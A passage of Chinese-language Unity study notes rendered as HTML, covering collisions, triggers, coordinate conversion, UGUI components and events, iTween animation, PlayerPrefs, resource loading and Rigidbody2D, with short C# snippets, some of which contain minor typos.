Mathf.Cos(rad / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">this</span>.transform.rotation = qt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 前方10m，30度位置</span></span><br><span class="line">Vector3 rect = <span class="keyword">this</span>.transform.position + Quaternion.Euler(<span class="number">0</span>,<span class="number">30</span>,<span class="number">0</span>) * <span class="keyword">this</span>.transform.rotation * <span class="keyword">new</span> Vector3(<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">// 分步</span></span><br><span class="line"><span class="comment">// vect向量根据当前物体旋转而旋转</span></span><br><span class="line">rect = <span class="keyword">this</span>.transform.rotation * <span class="keyword">new</span> Vector3(<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line"><span class="comment">// vect向量沿y轴旋转30度</span></span><br><span class="line">rect = Quaternion.Euler(<span class="number">0</span>,<span class="number">30</span>,<span class="number">0</span>) * rect;</span><br><span class="line"><span class="comment">// vect向量移动到当前物体位置</span></span><br><span class="line">rect = <span class="keyword">this</span>.transform.position + rect;</span><br></pre></td></tr></table></figure><h3 id="6-碰撞"><a href="#6-碰撞" class="headerlink" title="6 碰撞"></a>6 碰撞</h3><p>概念</p><blockquote><p>碰撞条件：两者都有碰撞组件，运动的物体有刚体组件。</p><p>速度不能过快，不然检测不到。一般100以下。</p></blockquote><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取第一个接触点</span></span><br><span class="line">ContactPoint cp = other.contacts[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 接触点的世界坐标</span></span><br><span class="line">cp.point;</span><br><span class="line"><span class="comment">// 接触面法线</span></span><br><span class="line">cp.normal;</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当进入碰撞时执行</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnCollisionEnter</span>(<span class="params">Collision other</span>)</span>;</span><br><span class="line"><span class="comment">// 碰撞体与刚体接触时每帧执行</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnCollisionStay</span>(<span class="params">Collision other</span>)</span>;</span><br><span class="line"><span class="comment">// 当停止碰撞时执行</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnCollisionExit</span>(<span class="params">Collision other</span>)</span>;</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnCollisionEnter</span>(<span class="params">Collision other</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取对方碰撞器组件</span></span><br><span class="line">    other.collider.GetComponent&lt;&gt;();</span><br><span class="line">    <span class="comment">// 获取第一个接触点</span></span><br><span class="line">    ContactPoint cp = other.contacts[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-触发"><a href="#7-触发" class="headerlink" title="7 触发"></a>7 触发</h3><p>概念</p><blockquote><p>带有碰撞器组件，且Is Trigger被勾选的物体。</p><p>现象：无碰撞效果。</p><p>触发条件：</p><ol><li>两者具有碰撞组件。</li><li>其中之一带有刚体组件。</li><li>其中之一勾选Is Trigger。</li></ol><p>速度不能过快，不然检测不到。一般100以下。</p></blockquote><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当Collider进入触发器时执行</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnTriggerEnter</span>(<span class="params">Collider other</span>)</span>;</span><br><span class="line"><span class="comment">// 碰撞体与触发器接触时每帧执行</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnTriggerStay</span>(<span class="params">Collider other</span>)</span>;</span><br><span class="line"><span class="comment">// 当停止触发时执行</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">OnTriggerExit</span>(<span class="params">Collider other</span>)</span>;</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnTriggerEnter</span>(<span class="params">Collision other</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 就是对方碰撞器组件</span></span><br><span class="line">    other.GetComponent&lt;&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-坐标系转化"><a href="#8-坐标系转化" class="headerlink" title="8 坐标系转化"></a>8 坐标系转化</h3><p>属性</p><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Local Space -&gt; World Space</span></span><br><span class="line"><span class="comment">// 转换点，受位置、旋转、缩放影响</span></span><br><span class="line">vector =  transform.TransformPoint(position);</span><br><span class="line"><span class="comment">// 转换方向，仅受旋转影响</span></span><br><span class="line">vector = transform.TransformDirection(position);</span><br><span class="line"><span class="comment">// 转换向量，受旋转和缩放影响</span></span><br><span class="line">vector = transform.TransformVector(position);</span><br><span class="line"></span><br><span class="line"><span class="comment">// World Space -&gt; Local Space</span></span><br><span class="line">vector =  transform.InverseTransformPoint(position);</span><br><span class="line">vector = transform.InverseTransformDirection(position);</span><br><span class="line">vector = transform.InverseTransformVector(position);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下列两个获得的坐标是作用于tag:Main Camera的摄像机（为了不重复找摄像机可以先创建Camera变量，再Camera.func()）</span></span><br><span class="line"><span class="comment">// World Space &lt;--&gt; Screen Space</span></span><br><span class="line">vector = Camera.main.WorldToScreenPoint(position);</span><br><span class="line">vector = Camera.main.ScreenToWorldPoint(position);</span><br><span class="line"></span><br><span class="line"><span class="comment">// World Space &lt;--&gt; Viewport Space</span></span><br><span class="line">vector = Camera.main.WorldToViewportPoint(position);</span><br><span class="line">vector = Camera.main.ViewportToWorldPoint(position);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获得屏幕坐标</span></span><br><span class="line">Vector3 screenPosition = <span class="keyword">new</span> Vector3(<span class="number">0.3f</span> * Screen.width, <span class="number">0.3f</span> * Screen.height, <span class="number">0f</span>);</span><br><span class="line">Vector3 worldPosition = Camera.main.ScreenToWorldPoint(screenPosition);</span><br></pre></td></tr></table></figure><hr><h2 id="六、-UGUI"><a href="#六、-UGUI" class="headerlink" title="六、 UGUI"></a>六、 UGUI</h2><blockquote><p>时代：OnGUI——NGUI——UGUI</p><p>UI操作时，设置为2D，并且按 T（左上角第五个操作） ，便于进行UI物体的操作。</p><p>左键操作物体，右键操作画布。</p></blockquote><h3 id="1-Canvas"><a href="#1-Canvas" class="headerlink" title="1 Canvas"></a>1 Canvas</h3><blockquote><p>UGUI中的所有元素必须在Canvas之下。</p></blockquote><ul><li><p>Render Mode：画布模式</p><ol><li>Screen Space - Overlay（屏幕空间 - 覆盖）：<ul><li>Canvas以屏幕为坐标系，覆盖在其他所有对象之上。</li><li>不会受到场景中物体的遮挡，始终会显示在最前面。</li><li>适用于出现在游戏界面上方的固定UI元素。</li></ul></li><li>Screen Space - Camera（屏幕空间 - 相机）：<ul><li>Canvas以相机为坐标系，并且渲染在相机的近裁剪面前。</li><li>可以通过指定渲染的目标摄像机来控制可视范围。</li><li>适用于与3D场景进行交互或需要基于相机进行渲染的UI元素。</li></ul></li><li>World Space（世界空间）：<ul><li>Canvas以世界坐标系进行绘制，可以放置在场景中的任意位置。</li><li>可以根据世界坐标位置进行缩放、旋转等变换操作。</li><li>注：在World Space模式下，通常需要借助Event System来处理交互事件。</li></ul></li></ol></li><li><p>Sort Order：</p><ul><li>同一画布下元素，后面的元素盖住前面的元素。</li><li>不同画布下，Sort Order大的盖住小的。</li></ul></li><li><p>Canvas Scaler</p><blockquote><p><span style="color:red;">做任何UI前必做，否则后续界面会乱！</span></p><p>UI Scale Mode：UI缩放模式。</p><ul><li>Scale With Screen Size：设置参考缩放大小。</li></ul><p>Match：缩放自适应。一般选小的那个（min(width,height)）。</p></blockquote></li><li><p>技巧</p><blockquote><p>3DUI：让文体或图片贴在3D物体上。首先设置相机为World Space模式，然后该Scale为(0.01,0.01,0.01)。然后改变Image或Text的物件的位置，让其和物体重合。之后移动相机就会发现它们一直是重合的。</p></blockquote></li></ul><h3 id="2-简单组件"><a href="#2-简单组件" class="headerlink" title="2 简单组件"></a>2 简单组件</h3><blockquote><p>通用：</p><p>Raycast Target：是否事件检测。</p></blockquote><ul><li><p>Panel</p><blockquote><p>一个界面就是一个Panel。切换界面是在同一个Canvas下切换不同Panel。</p></blockquote></li><li><p>Image</p><blockquote><p>格式：图片——Texture Type——Sprite。</p><p>Image Type：图片类型</p><ul><li>Filled：类似技能冷却。（Fill Amount：转圈）</li></ul><p>Set Native Size：根据图片大小设置大小。</p><p>优化原理：界面中默认一张图片一个Draw Calls，同一张图多次显示仍是一个Draw Calls。所以可以把多个小图放到一个大图中，这样就是一个Draw Calls。</p><p>Sprite打包步骤如下：</p><ol><li>Window——Package Manager——Packages:Unity Registry——2D Sprite——Install</li><li>Edit——Project Settings——Editor——Sprite Packer——Mode设置为Enabled For Builds 或 Always Enabled（建议第一个。第一个是仅项目打包时检查图片变化，第二个是每次都会检查图片变化。）</li><li>Create——2D——Sprite altas。</li><li>将图片添加到图集中。</li></ol><p>Sprite切割步骤如下（图集不可切割）：</p><ol><li>Sprite Mode——Multiple</li><li>Sprite Editor</li><li>左上角第二个箭头——Type（切割模式）——切割后改名（若名字错误不可在文件中直接改，而是按此步骤重新在编辑器中改）</li></ol></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 新版加载图集</span></span><br><span class="line">SpriteAtlas sprites = Resources.Load&lt;SpriteAtlas&gt;(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取图集中元素（打包时无法通过编译）</span></span><br><span class="line"><span class="keyword">foreach</span> (Sprite sprite <span class="keyword">in</span> sprites.GetPackables())&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取图集中元素</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">ResourcesManager</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        spriteDict = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">int</span>, Sprite&gt;();</span><br><span class="line"></span><br><span class="line">        Sprite[] sprites = LoadSpritesFromAtlas(<span class="string">&quot;People&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (Sprite sprite <span class="keyword">in</span> sprites)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 去除（Clone后缀）</span></span><br><span class="line">            sprite.name = sprite.name.Replace(<span class="string">&quot;(Clone)&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            <span class="built_in">int</span> id = <span class="built_in">int</span>.Parse(sprite.name);</span><br><span class="line">            spriteDict.Add(id, sprite);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 加载 SpriteAtlas 中的精灵</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Sprite[] <span class="title">LoadSpritesFromAtlas</span>(<span class="params"><span class="built_in">string</span> atlasName</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Sprite[] sprites = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 加载 SpriteAtlas</span></span><br><span class="line">    SpriteAtlas spriteAtlas = Resources.Load&lt;SpriteAtlas&gt;(atlasName);</span><br><span class="line">    <span class="keyword">if</span> (spriteAtlas != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取 SpriteAtlas 中的所有精灵</span></span><br><span class="line">        sprites = <span class="keyword">new</span> Sprite[spriteAtlas.spriteCount];</span><br><span class="line">        spriteAtlas.GetSprites(sprites);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sprites;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>TextMeshPro</p><blockquote><p> 安装：Window——TextMeshPro——Import TMP Essential Resources</p><p>Rich Text：可以写部分html标签改变字的样式。</p><p>字体格式：.ttf——右键——Cteate——TextMeshPro——Font Asset</p></blockquote></li><li><p>Button</p><blockquote><p>在Button绑子物体Text完成一个简单按钮制作。</p><p>Interactable：是否可交互。</p><p>Transition：不同情况下按钮的变化。</p><p>Navigation：一般没用，设置None可以解决点击后颜色显示不正常的BUG。</p></blockquote></li><li><p>Toggle</p><blockquote><p>复选框。</p><p>Toggle——Background：背景框样式。</p><p>Toggle——Background——Checkmark：选中样式。</p><p>Toggle——Label：文本样式。</p><p>Is On：是否选中。</p></blockquote></li><li><p>Slider</p><blockquote><p>滑动条。</p><p>做血条可以点Interactable不允许交互。</p></blockquote></li><li><p>Scrollbar</p><blockquote><p>滚动条。</p></blockquote></li><li><p>Dropdown</p><blockquote><p>下拉框。</p></blockquote></li></ul><h3 id="3-Rect-Transform"><a href="#3-Rect-Transform" class="headerlink" title="3 Rect Transform"></a>3 Rect Transform</h3><p>概念</p><blockquote><p>Pos：控件轴心点相对于自身锚点的位置。</p><p>Pivot：控件轴心点位置。</p><p>锚点：合并会进行位置自适应，分开会进行大小自适应。（点击middle center图像可以选择锚点位置）</p></blockquote><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 画布为overlay时，世界坐标等同于屏幕坐标</span></span><br><span class="line"><span class="keyword">this</span>.transform.position;</span><br><span class="line"><span class="comment">// 当前轴心点相对于父UI的轴心点位置</span></span><br><span class="line"><span class="keyword">this</span>.transform.localPosition;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得组件</span></span><br><span class="line">RectTransform rtf = GetComponent&lt;RectTransform&gt;();</span><br><span class="line">RectTransform rtf = <span class="keyword">this</span>.transform <span class="keyword">as</span> RectTransform;</span><br><span class="line"><span class="comment">// 等同transform</span></span><br><span class="line">rtf.position;rtf.localPosition;</span><br><span class="line"><span class="comment">// 自身轴心点相对于锚点位置</span></span><br><span class="line">vector3 rtf.anchoredPosition3D;</span><br><span class="line"><span class="comment">// 设置锚点</span></span><br><span class="line">vector2 rtf.anchorMin;</span><br><span class="line"><span class="comment">// 中心点</span></span><br><span class="line">rtf.pivot;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取UI宽高</span></span><br><span class="line">rtf.rect.width;</span><br><span class="line">rtf.rect.height;</span><br><span class="line"><span class="comment">// 物体大小 - 锚点间距</span></span><br><span class="line">vector2 rtf.sizeDelta;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 官方文档搜索查询其中的方法</span></span><br><span class="line">RectTransformUtility</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置宽高（设置方式，宽或高）</span></span><br><span class="line">rectTransform.SetSizeWithCurrentAnchors(RectTransform.Axis.Horizontal, <span class="number">250</span>);</span><br></pre></td></tr></table></figure><h3 id="4-事件"><a href="#4-事件" class="headerlink" title="4 事件"></a>4 事件</h3><blockquote><p>绑定事件：</p><ol><li>编辑器绑定<ol><li>把脚本拖到物体上</li><li>把物体拖到按钮事件中</li><li>找到函数并添加即可（函数可以有参数string）</li></ol></li><li>AddListener</li><li>实现接口</li><li>自定义框架</li></ol><p>管理事件：</p><ul><li>Event System(Script)：管理事件</li><li>Standalone Input Module(Script)：分发和检测事件（作用于PC和移动）</li><li>Graphic Raycaster(Script)：检测事件</li></ul></blockquote><p>接口事件</p><blockquote><p>使用：</p><ol><li>在类后面继承对应的事件类</li><li>Ctrl + .后接回车，会自动生成一个函数</li></ol></blockquote><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 鼠标指针类</span></span><br><span class="line">IPointerEnterHandler;</span><br><span class="line">IPointerExitHandler;</span><br><span class="line">IPointerDownHandler;</span><br><span class="line">IPointerUPHandler;</span><br><span class="line">IPointerClickHandler;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拖拽类</span></span><br><span class="line">IBeginDragHandler;</span><br><span class="line">IDragHandler;</span><br><span class="line">IEndDragHandler;</span><br><span class="line">IDropHandler;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点选类</span></span><br><span class="line">IUpdateSelectedHandler;</span><br><span class="line">ISelectHandler;</span><br><span class="line">IDeselectHandler;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输入类</span></span><br><span class="line">IScrollHandler;</span><br><span class="line">IMoveHandler;</span><br><span class="line">ISubmitHandler;</span><br><span class="line">ICancelHandler;</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 2.AddListener</span></span><br><span class="line"><span class="comment">// 找到物体</span></span><br><span class="line">Button btn = <span class="keyword">this</span>.transform.Find(<span class="string">&quot;Button&quot;</span>).GetComponent&lt;Button&gt;();</span><br><span class="line"><span class="comment">// 绑定事件（参数是函数，不同事件函数要求不同）</span></span><br><span class="line">btn.onClick.AddListener(Func);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3.实现接口（引用事件类，编写事件类函数，然后把脚本给有Raycast Target的物体）</span></span><br><span class="line"><span class="comment">// 双击事件(IPointerClickHandler)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnPointerClick</span>(<span class="params">PointerEventData eventData</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">       <span class="keyword">if</span>(eventData.clickCount == <span class="number">2</span>) &#123; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拖拽事件（鼠标会自动居中）</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnDrag</span>(<span class="params">PointerEventData eventData</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">// 仅限相机是overlay模式</span></span><br><span class="line">        <span class="keyword">this</span>.transform.position = eventData.position;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 通用的拖拽</span></span><br><span class="line">        RectTransform parentRTF = <span class="keyword">this</span>.transform.parent <span class="keyword">as</span> RectTransform;</span><br><span class="line">        Vector2 worldPos;</span><br><span class="line">    <span class="comment">// （父物体坐标，事件坐标，相机（选press，enter会出错），输出坐标）</span></span><br><span class="line">        RectTransformUtility.ScreenPointToLocalPointInRectangle(parentRTF, eventData.position, eventData.pressEventCamera, <span class="keyword">out</span> worldPos);</span><br><span class="line">        <span class="keyword">this</span>.transform.localPosition = worldPos;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拖拽鼠标不居中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">EventDemo</span> : <span class="title">MonoBehaviour</span>, <span class="title">IPointerDownHandler</span>, <span class="title">IDragHandler</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> RectTransform parentRectTransform;</span><br><span class="line">    <span class="keyword">private</span> Vector2 offset;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        parentRectTransform = transform.parent <span class="keyword">as</span> RectTransform;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnPointerDown</span>(<span class="params">PointerEventData eventData</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 计算鼠标点击位置与控件中心的偏移量</span></span><br><span class="line">        offset = (Vector2)transform.position - eventData.position;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnDrag</span>(<span class="params">PointerEventData eventData</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        Vector2 localPos;</span><br><span class="line">        <span class="keyword">if</span> (RectTransformUtility.ScreenPointToLocalPointInRectangle(parentRectTransform, eventData.position, eventData.pressEventCamera, <span class="keyword">out</span> localPos))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 将鼠标点击位置与偏移量应用到控件的位置上</span></span><br><span class="line">            transform.localPosition = localPos + offset;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-iTween"><a href="#5-iTween" class="headerlink" title="5 iTween"></a>5 iTween</h3><p>概念</p><blockquote><p>下载：<a href="http://www.pixelplacement.com/itween/index.php">official::iTween下载</a></p><p>导入：Window——Package Manager——Packages:My Assets——Download——Import</p><p>目的是轻松实现各种动画。</p></blockquote><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.物体移动</span></span><br><span class="line">iTween.MoveTo();</span><br><span class="line"><span class="comment">// 2.颜色渐变</span></span><br><span class="line">iTw2een.ColorTo();</span><br><span class="line"><span class="comment">// 3.物体淡入淡出</span></span><br><span class="line">iTween.FadeTo();</span><br><span class="line"><span class="comment">// 4.摄像机淡入淡出</span></span><br><span class="line">iTween.CameraFadeAdd();</span><br><span class="line">iTween.CameraFadeTo();</span><br><span class="line"><span class="comment">// 5.注视旋转</span></span><br><span class="line">iTween.LookTo();</span><br><span class="line"><span class="comment">// 6.物体旋转</span></span><br><span class="line">iTween.RotateTo();</span><br><span class="line"><span class="comment">// 7.物体缩放</span></span><br><span class="line">iTween.ScaleTo();</span><br><span class="line"><span class="comment">// 8.晃动</span></span><br><span class="line">iTween.PunchPosition();</span><br><span class="line">iTween.PunchRotation();</span><br><span class="line">iTween.PunchScale();</span><br><span class="line"><span class="comment">// 9.震动</span></span><br><span class="line">iTween.ShakePosition();</span><br><span class="line">iTween.ShakeRotation();</span><br><span class="line">iTween.ShakeScale();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 10.hash值，自己设置动画参数（参数都是逗号隔开）</span></span><br><span class="line">iTween.Hash();</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 平缓移动，绑定在事件中调用一次即可</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ITweenDemo</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> Transform imgTF, btnTF;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> moveSpeed = <span class="number">100</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DoMovement</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 调用一次即可</span></span><br><span class="line">        iTween.MoveTo(imgTF.gameObject, btnTF.position, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用hash设置参数</span></span><br><span class="line"><span class="keyword">public</span> iTween.EaseType type;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">DoMovement</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 调用一次即可</span></span><br><span class="line">    iTween.MoveTo(imgTF.gameObject, iTween.Hash(</span><br><span class="line">        <span class="string">&quot;position&quot;</span>,btnTF.position,</span><br><span class="line">        <span class="string">&quot;speed&quot;</span>,moveSpeed</span><br><span class="line">        <span class="string">&quot;easetype&quot;</span>,type</span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 缩放由0-&gt;1</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">CreateEffect</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    iTween.ScaleFrom(gameObject, Vector3.zero, <span class="number">0.3f</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 动画结束时调用函数</span></span><br><span class="line">iTween.MoveFrom(imgTF.gameObject,iTween.Hash(</span><br><span class="line">    <span class="string">&quot;position&quot;</span>,btnTF.position,</span><br><span class="line">    <span class="string">&quot;speed&quot;</span>,moveSpeed,</span><br><span class="line">    <span class="string">&quot;easetype&quot;</span>,type,</span><br><span class="line">    <span class="comment">// 完成动画时调用的函数</span></span><br><span class="line">    <span class="string">&quot;oncomplete&quot;</span>,<span class="string">&quot;Func&quot;</span>,</span><br><span class="line">    <span class="comment">// 函数所在的对象</span></span><br><span class="line">    <span class="string">&quot;oncompletetarget&quot;</span>,gameObject</span><br><span class="line">));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Func</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    print(<span class="string">&quot;over!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="七、存储"><a href="#七、存储" class="headerlink" title="七、存储"></a>七、存储</h2><h3 id="1-PlayerPrefs"><a href="#1-PlayerPrefs" class="headerlink" title="1 PlayerPrefs"></a>1 PlayerPrefs</h3><p>概念</p><blockquote><p>持久的在本地进行存储。</p></blockquote><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 保存数据</span></span><br><span class="line">PlayerPrefs.SetFloat(key,<span class="keyword">value</span>);</span><br><span class="line">PlayerPrefs.SetInt(key,<span class="keyword">value</span>);</span><br><span class="line">PlayerPrefs.SetString(key,<span class="keyword">value</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取数据</span></span><br><span class="line">PlayerPrefs.GetFloat(key,<span class="literal">default</span>);</span><br><span class="line">PlayerPrefs.GetInt(key,<span class="literal">default</span>);</span><br><span class="line">PlayerPrefs.GetString(key,<span class="literal">default</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除数据</span></span><br><span class="line">PlayerPrefs.DeleteAll();</span><br><span class="line">PlayerPrefs.DeleteKey(key);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断存在键</span></span><br><span class="line">PlayerPrefs.HasKey(key);</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-SceneManager"><a href="#2-SceneManager" class="headerlink" title="2 SceneManager"></a>2 SceneManager</h3><p>概念</p><blockquote><p>场景切换。</p></blockquote><p>方法</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加载场景</span></span><br><span class="line">SceneManager.LoadScene(<span class="string">&quot;SceneName&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="3-外部资源加载"><a href="#3-外部资源加载" class="headerlink" title="3 外部资源加载"></a>3 外部资源加载</h3><p>Resources</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加载Resources文件夹中的内容</span></span><br><span class="line">Sprite Resources.Load&lt;Sprite&gt;(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载Resources文件夹中的图集</span></span><br><span class="line"><span class="comment">// 老版打包</span></span><br><span class="line">Sprite[] Resources.LoadAll&lt;Sprite&gt;(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="comment">// 新版图集</span></span><br><span class="line">SpriteAtlas sprites = Resources.Load&lt;SpriteAtlas&gt;(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span> (Sprite sprite <span class="keyword">in</span> sprites.GetPackables())&#123;&#125;</span><br></pre></td></tr></table></figure><p>AssetDatabase</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加载Assets文件夹中的内容</span></span><br><span class="line"><span class="built_in">string</span> assetPath = <span class="string">&quot;Assets/Folder/FileName.extension&quot;</span>;</span><br><span class="line">GameObject asset = AssetDatabase.LoadAssetAtPath&lt;GameObject&gt;(assetPath);</span><br></pre></td></tr></table></figure><hr><h2 id="八、Component"><a href="#八、Component" class="headerlink" title="八、Component"></a>八、Component</h2><h3 id="1-Rigidbody-2D"><a href="#1-Rigidbody-2D" class="headerlink" title="1 Rigidbody 2D"></a>1 Rigidbody 2D</h3><p>概念</p><blockquote><p>2D刚体</p></blockquote><p>属性</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Rigidbody2D rb = GetComponent&lt;Rigidbody2D&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 刚体的速度矢量</span></span><br><span class="line">rb.velocity = <span class="keyword">new</span> Vector2(x,y);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 力的方式</span></span><br><span class="line">ForceMode2D.Force;</span><br><span class="line"><span class="comment">/*这种力的方式是通过应用持续的力来改变物体的速度。例如，使用这种方式可以为角色施加一个持续的推力，使其沿着某个方向移动。*/</span></span><br><span class="line"></span><br><span class="line">ForceMode2D.Impulse;</span><br><span class="line"><span class="comment">/*这种力的方式是通过一次性的冲量来改变物体的速度。例如，在玩家跳跃时可以使用这种方式为角色施加一个瞬间冲击力，使其获得垂直的向上速度。*/</span></span><br><span class="line"></span><br><span class="line">ForceMode2D.VelocityChange;</span><br><span class="line"><span class="comment">/*这种力的方式是通过改变物体的速度来实现所需效果。例如，如果要使物体突然停止或改变方向，可以使用这种方式为物体施加一个速度变化的力。*/</span></span><br><span class="line"></span><br><span class="line">ForceMode2D.Acceleration;</span><br><span class="line"><span 